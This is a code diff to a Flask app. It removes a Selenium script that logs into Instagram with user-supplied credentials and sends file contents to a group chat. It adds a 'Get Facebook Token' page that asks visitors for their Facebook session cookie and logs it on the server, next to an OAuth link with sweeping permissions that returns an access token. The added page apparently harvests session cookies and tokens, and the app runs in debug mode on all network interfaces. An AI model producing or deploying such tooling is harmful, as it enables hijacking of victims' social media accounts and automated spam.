@@ -1,85 +1,125 @@
-from flask import Flask, render_template, request, redirect, url_for, flash
-import time
-import os
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.chrome.service import Service
-from selenium.webdriver.chrome.options import Options
-from webdriver_manager.chrome import ChromeDriverManager
+from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
-app.secret_key = 'your_secret_key_here'  # Needed for flash messages
 
-# Route to show the home page
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-# Route to handle login, group message, and file upload
-@app.route('/login', methods=['POST'])
-def login_and_send_message():
-    username = request.form['username']
-    password = request.form['password']
-    group_chat_id = request.form['group_chat_id']
-    delay = int(request.form['delay'])
-
-    # File handling (e.g., txt files with messages to send)
-    file = request.files['message_file']
-    if not file or file.filename == '':
-        flash("No file selected", "error")
-        return redirect(url_for('index'))
-    
-    file_content = file.read().decode('utf-8')
-
-    # Setup Selenium WebDriver
-    chrome_options = Options()
-    chrome_options.add_argument("--headless")  # Run in headless mode (no browser window)
-    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
-
-    try:
-        # Open Instagram login page
-        driver.get('https://www.instagram.com/accounts/login/')
-        time.sleep(2)
-
-        # Locate the username and password fields and log in
-        driver.find_element(By.NAME, 'username').send_keys(username)
-        driver.find_element(By.NAME, 'password').send_keys(password)
-        driver.find_element(By.NAME, 'password').send_keys(Keys.RETURN)
-
-        # Wait for the login to complete (adjust time based on network speed)
-        time.sleep(5)
-
-        # Navigate to direct messages (Group chat ID is needed here)
-        driver.get(f'https://www.instagram.com/direct/inbox/')
-        time.sleep(2)
-
-        # Locate the group chat and click it (the selector might need adjustment)
-        group_chat = driver.find_element(By.XPATH, f"//div[contains(@class, 'MTXfT') and @aria-label='{group_chat_id}']")
-        group_chat.click()
-
-        # Wait for the chat to open
-        time.sleep(2)
-
-        # Locate the message input box and send the message
-        message_box = driver.find_element(By.XPATH, "//textarea[@placeholder='Message...']")
-        message_box.send_keys(file_content)  # Send the content from the file
-        message_box.send_keys(Keys.RETURN)
-
-        # Wait for the message to be sent
-        time.sleep(delay)
-
-        # Close the driver after sending the message
-        driver.quit()
-
-        flash("Message sent successfully!", "success")
-        return redirect(url_for('index'))
-
-    except Exception as e:
-        driver.quit()
-        flash(f"An error occurred: {e}", "error")
-        return redirect(url_for('index'))
-
-if __name__ == '__main__':
-    app.run(debug=True, port=5000)
+# HTML Content
+HTML_PAGE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Facebook Token</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            width: 400px;
+            padding: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            text-align: center;
+        }
+        textarea, input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .output {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #333;
+        }
+        .copy-button {
+            margin-top: 10px;
+            padding: 5px 10px;
+            font-size: 14px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .copy-button:hover {
+            background-color: #0056b3;
+        }
+        .connect-button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #17a2b8;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .connect-button:hover {
+            background-color: #138496;
+        }
+    </style>
+    <script>
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(function() {
+                alert("Token copied to clipboard!");
+            }, function(err) {
+                alert("Failed to copy token: " + err);
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Get Facebook Token</h1>
+        <p>Enter your Facebook cookie below:</p>
+        <form method="post">
+            <textarea name="cookie" rows="5" placeholder="Enter your Facebook cookie here..."></textarea><br>
+            <button type="submit">Get Token</button>
+        </form>
         
+        <a href="https://www.facebook.com/dialog/oauth?scope=user_about_me,user_actions.books,user_actions.fitness,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_friends,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_managed_groups,user_photos,user_posts,user_relationship_details,user_relationships,user_religion_politics,user_status,user_tagged_places,user_videos,user_website,user_work_history,email,manage_notifications,manage_pages,pages_messaging,publish_actions,publish_pages,read_friendlists,read_insights,read_page_mailboxes,read_stream,rsvp_event,read_mailbox&response_type=token&client_id=124024574287414&redirect_uri=https://www.instagram.com/" target="_blank">
+            <button type="button" class="connect-button">Connect Instagram</button>
+        </a>
+    </div>
+</body>
+</html>
+"""
+
+@app.route("/", methods=["GET", "POST"])
+def index():
+    if request.method == "POST":
+        # Retrieve the cookie from the form
+        fb_cookie = request.form.get("cookie", "")
+        
+        # Placeholder for processing the cookie (replace with your logic)
+        print("Received Cookie:", fb_cookie)
+        
+        return render_template_string(HTML_PAGE)
+    
+    return render_template_string(HTML_PAGE)
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
+
